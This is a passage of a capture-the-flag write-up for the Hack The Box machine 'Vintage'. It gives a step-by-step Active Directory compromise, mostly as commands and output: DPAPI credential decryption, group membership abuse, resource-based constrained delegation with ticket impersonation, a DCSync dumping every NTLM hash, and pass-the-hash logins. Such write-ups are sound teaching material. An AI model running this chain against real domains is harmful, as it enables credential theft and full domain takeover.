SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] krb5 conf saved to: krb5.conf
SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0the0ne
```

We make a backup of our current config and we copy the file over the current /etc/krb5.conf

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo cp /etc/krb5.conf /etc/krb5.conf.bak    
[sudo] password for kali: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ ls /etc/krb5.conf
/etc/krb5.conf
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo cp krb5.conf /etc/krb5.conf
```

Next we get a ticket for our user

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ kinit c.neri
Password for c.neri@VINTAGE.HTB:

┌──(kali㉿kali)-[~/Downloads]
└─$ klist       
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: c.neri@VINTAGE.HTB

Valid starting       Expires              Service principal
11/25/2025 22:56:35  11/26/2025 08:56:35  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 11/26/2025 22:56:32
```

We can now login with winrm

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents>
```

We list the files and see the user flag

```shellscript
*Evil-WinRM* PS C:\Users\C.Neri> tree /f
Folder PATH listing
Volume serial number is B8C0-0CD3
C:.
+---3D Objects
+---Contacts
+---Desktop
¦       Microsoft Edge.lnk
¦       user.txt
¦
+---Documents
+---Downloads
+---Favorites
¦   ¦   Bing.url
¦   ¦
¦   +---Links
+---Links
¦       Desktop.lnk
¦       Downloads.lnk
¦
+---Music
+---Pictures
+---Saved Games
+---Searches
+---Videos
```

We check for hidden directories and decide to look for DPAPI creds in the AppData folder

```shellscript
*Evil-WinRM* PS C:\Users\C.Neri> gci -force 


    Directory: C:\Users\C.Neri


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          6/7/2024   1:17 PM                3D Objects
d--h--          6/7/2024  11:49 AM                AppData
```

The DPAPI data is in `\AppData\Roaming\Microsoft\Credentials` and the key in `\AppData\Roaming\Microsoft\Protect\<SID>`

The file was hidden, so we had to use `gci -force` to see it

```shellscript
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> ls 
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> gci -force 


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
```

We transfer the files to our host

```shellscript
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> [Convert]::ToBase64String((Get-Content -path "C4BB96844A5C9DD45D5B6A9859252BA6" -Encoding byte))
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==

┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n 'AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==' | base64 -d > dpapi_data


```

We decrypt the key

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ dpapi.py masterkey -file key1 -sid 'S-1-5-21-4024337825-2033394866-2055507597-1115'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Password:
Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
```

Then we can decrypt the passwords

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ dpapi.py credential -file dpapi_data -key '0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

We can now login with `c.neri_adm:Uncr4ck4bl3P4ssW0rd0312`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FtwRh8kKXo2Gh6mCETbd1%2Fimage.png?alt=media&#x26;token=92ceedbb-e547-4722-b2d7-16fa7d141668" alt=""><figcaption></figcaption></figure>

As we try to ad c.neri\_adm to delegatedAdmins, we see that he is already part of it

If we use the shortest path to domain admin query, we see the following. C.neri can add users to delegatedAdmins.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FOtzI7TeVqAF9aFfHrl75%2Fimage.png?alt=media&#x26;token=4f021824-23c5-43a2-91c5-1d43ed912a5a" alt=""><figcaption></figcaption></figure>

In order to make the attack work, we need to have control over a user who has a SPN set, that user need to be made part of DelegatedAdmins, and we can't impersonate a user who is in the Protected Users group.

In our case, we have control over the svc\_sql account and we can add him to the DelegatedAdmins group.

First, we add svc\_sql to the group

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'c.neri_adm' -p Uncr4ck4bl3P4ssW0rd0312 add groupMember 'DelegatedAdmins' 'svc_sql' 
[+] svc_sql added to DelegatedAdmins
```

We configure RBCD on the target

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ rbcd.py  -delegate-to 'DC01$' -delegate-from 'svc_sql' -dc-host dc01.vintage.htb -k -action write vintage.htb/c.neri_adm:'Uncr4ck4bl3P4ssW0rd0312'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Accounts allowed to act on behalf of other identity:
[*]     DelegatedAdmins   (S-1-5-21-4024337825-2033394866-2055507597-1131)
[-] Could not modify object, the server reports insufficient rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

[*] Accounts allowed to act on behalf of other identity:
[*]     DelegatedAdmins   (S-1-5-21-4024337825-2033394866-2055507597-1131)
```

Then we request a service ticket as the user we want to impersonate

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ getST.py -spn cifs/dc01.vintage.htb -impersonate 'Administrator' -dc-ip dc01.vintage.htb -k vintage.htb/svc_sql:'Zer0the0ne' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

We try the creds and get an error, probably because the admin user is disabled for security reasons

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.vintage.htb -u 'Administrator' -k --use-kcache 
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator from ccache STATUS_LOGON_TYPE_NOT_GRANTED
```

We will tryto impersonate the DC01$ account instead and DCSync

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ getST.py -spn cifs/dc01.vintage.htb -impersonate 'DC01$' -dc-ip dc01.vintage.htb -k vintage.htb/svc_sql:'Zer0the0ne'       
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

DCSync

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ secretsdump.py -just-dc-ntlm -k -no-pass -dc-ip dc01.vintage.htb vintage.htb/'DC01$'@dc01.vintage.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6e337c9d712fe2287e4de6241b6687b3:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:c3e2d44f1a108288b0906a796587ddee:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Cleaning up...
```

The administrator user is disabled, so we look for a domain admin and find l.bianca\_adm

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.vintage.htb -u 'l.bianchi_adm' -H 6e337c9d712fe2287e4de6241b6687b3 -k                                                             
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\l.bianchi_adm:6e337c9d712fe2287e4de6241b6687b3 (Pwn3d!)
```

We get a TGT

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ getTGT.py vintage.htb/l.bianchi_adm -dc-ip 10.10.11.45 -hashes :6e337c9d712fe2287e4de6241b6687b3          
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in l.bianchi_adm.ccache
```

And login with winrm
